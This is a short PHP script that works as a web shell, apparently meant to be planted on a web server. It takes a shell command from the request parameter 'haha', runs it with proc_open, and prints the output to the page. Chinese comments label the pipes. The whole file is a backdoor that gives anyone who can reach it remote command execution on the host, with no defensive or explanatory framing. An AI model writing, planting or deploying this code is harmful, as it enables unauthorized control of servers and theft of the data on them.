<?php
  $c=@$_REQUEST[haha];       
  $array = array(
            array("pipe", "r"),   //标准输入
            array("pipe", "w"),   //标准输出内容
            array("pipe", "w")    //标准输出错误
        );
   $fp = proc_open($c,$array,$pipes);
   $o = stream_get_contents($pipes[1]);
   echo nl2br($o);
   proc_close($fp);
?>